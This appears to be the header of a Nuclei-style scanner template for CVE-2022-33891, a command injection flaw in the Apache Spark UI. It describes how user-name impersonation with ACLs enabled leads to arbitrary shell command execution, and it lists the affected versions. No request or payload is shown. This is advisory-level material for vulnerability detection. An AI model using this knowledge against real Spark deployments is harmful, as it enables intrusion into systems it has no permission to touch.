id: CVE-2022-33891

info:
  name: Apache Spark UI - Remote Command Injection
  author: princechaddha
  severity: high
  description: |
    Apache Spark UI is susceptible to remote command injection. ACLs can be enabled via the configuration option spark.acls.enable. With an authentication filter, this checks whether a user has access permissions to view or modify the application. If ACLs are enabled, a code path in HttpSecurityFilter can allow impersonation by providing an arbitrary user name. An attacker can potentially reach a permission check function that will ultimately build a Unix shell command based on input and execute it, resulting in arbitrary shell command execution. Affected versions are 3.0.3 and earlier, 3.1.1 to 3.1.2, and 3.2.0 to 3.2.1.
